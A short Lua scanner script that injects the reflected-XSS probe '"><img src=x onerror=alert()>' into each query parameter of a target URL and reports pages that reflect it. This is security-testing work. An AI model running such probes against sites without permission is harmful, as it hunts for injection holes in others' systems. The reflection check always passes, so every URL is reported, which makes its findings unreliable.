REPORT = {}
VALID = false


PAYLOAD = '"><img src=x onerror=alert()>'

local function main(url)
    local new_querys = change_urlquery(url,PAYLOAD)
    for url_index, new_url in pairs(new_querys) do 
        local resp = send_req(new_url)
        local body = resp.body:GetStrOrNil()
        if body == "" then
            return
        end
        local css_pattern = generate_css_selector(PAYLOAD)
        local searcher = html_search(body,css_pattern)
        if string.len(searcher) then
            println(string.format("RXSS: %s | %s | %s",new_url,PAYLOAD,css_pattern))
        end
    end
    return REPORT
end


main(TARGET_URL)
